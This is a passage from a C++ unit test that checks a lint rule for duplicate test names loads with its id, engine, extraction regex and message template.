                 "extract: (?:it|test)\\(\\s*['\"]([^'\"]+)['\"]\n"
                 "message: Dup '{match}'\n");

      WHEN("the rule is loaded") {
        auto rules = rules_load(tmp_dir);
        THEN("it loads with extract fields") {
          REQUIRE(rules.size() == 1);
          CHECK(rules[0].id == "DUP-001");
          CHECK(rules[0].engine == "extract-duplicates");
          CHECK(rules[0].extract_regex.find("it|test") != std::string::npos);
          CHECK(rules[0].extract_message == "Dup '{match}'");
        }
      }
      unlink((tmp_dir + "/dup.rule").c_str());
      cleanup_dir(tmp_dir);
    }
  }

}  // TEST_SUITE("rules")
